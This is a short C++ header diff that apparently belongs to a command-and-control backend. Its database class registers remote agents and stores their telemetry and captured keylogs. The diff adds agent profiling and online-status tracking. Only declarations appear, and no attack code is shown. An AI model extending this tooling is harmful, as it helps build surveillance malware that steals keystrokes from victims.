@@ -8,7 +8,20 @@
 #include <QDateTime>
 #include <QDebug>
 
+#include <QStringList>
+#include <QDateTime>
+
 namespace inferno {
+
+struct AgentProfile {
+    QString uuid;
+    QString ip;
+    QString hostname;
+    QString osInfo;
+    QDateTime firstSeen;
+    QDateTime lastSeen;
+    bool isOnline;
+};
 
 class Inferno_Database : public QObject {
     Q_OBJECT
@@ -23,6 +36,10 @@ public:
     int registerAgent(const QString& uuid, const QString& ip, const QString& hostname, const QString& osInfo);
     void logTelemetry(const QString& uuid, const QString& type, const QString& content);
     void logKeylog(const QString& uuid, const QString& windowTitle, const QString& content);
+
+    // Liveness & Profiling (Circle 5 Phase II)
+    void setAgentOnlineStatus(const QString& uuid, bool online);
+    AgentProfile getAgentProfile(const QString& uuid);
 
     // Retrieval for Auditing
     QStringList getTelemetryHistory(const QString& uuid, const QString& type = "ALL", int limit = 1000);
